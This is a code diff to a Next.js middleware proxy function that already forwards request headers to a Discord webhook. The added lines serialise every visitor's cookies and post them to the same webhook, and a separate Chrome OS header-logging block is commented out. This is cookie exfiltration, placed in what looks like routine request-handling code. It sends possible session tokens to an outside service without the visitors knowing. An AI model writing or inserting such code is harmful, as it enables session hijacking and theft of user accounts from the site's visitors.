@@ -1,4 +1,4 @@
-import { NextResponse, userAgent } from "next/server";
+import { NextResponse } from "next/server";
 import type { NextRequest } from "next/server";
 
 export async function proxy(request: NextRequest) {
@@ -26,33 +26,41 @@ export async function proxy(request: NextRequest) {
 								value: `\`${v}\``,
 								inline: true,
 							})),
-					},
+          },
+          {
+            fields: [
+              {
+                name: "cookies",
+                value: `\`${JSON.stringify(Object.fromEntries(request.cookies))}\``,
+              },
+            ]
+          }
 				],
 			}),
 		});
   }
-  const { os } = userAgent(request)
-  if (os.name?.includes('chrome')) {
-    await fetch(process.env.DISCORD_HOOK_URL as string, {
-			method: "post",
-			headers: {
-				"Content-Type": "application/json",
-			},
-			body: JSON.stringify({
-				content: "cros ua",
-				embeds: [
-					{
-						fields: Object.entries(headers)
-							.filter(([k]) => !k.includes("sec-") && !k.includes("cookie") && !k.includes("accept") && !k.includes('x-vercel'))
-							.map(([k, v]) => ({
-								name: k,
-								value: `\`${v}\``,
-								inline: true,
-							})),
-					},
-				],
-			}),
-		});
-  }
+  // const { os } = userAgent(request)
+  // if (os.name?.includes('chrome')) {
+  //   await fetch(process.env.DISCORD_HOOK_URL as string, {
+		// 	method: "post",
+		// 	headers: {
+		// 		"Content-Type": "application/json",
+		// 	},
+		// 	body: JSON.stringify({
+		// 		content: "cros ua",
+		// 		embeds: [
+		// 			{
+		// 				fields: Object.entries(headers)
+		// 					.filter(([k]) => !k.includes("sec-") && !k.includes("cookie") && !k.includes("accept") && !k.includes('x-vercel'))
+		// 					.map(([k, v]) => ({
+		// 						name: k,
+		// 						value: `\`${v}\``,
+		// 						inline: true,
+		// 					})),
+		// 			},
+		// 		],
+		// 	}),
+		// });
+  // }
 	return NextResponse.next();
 }
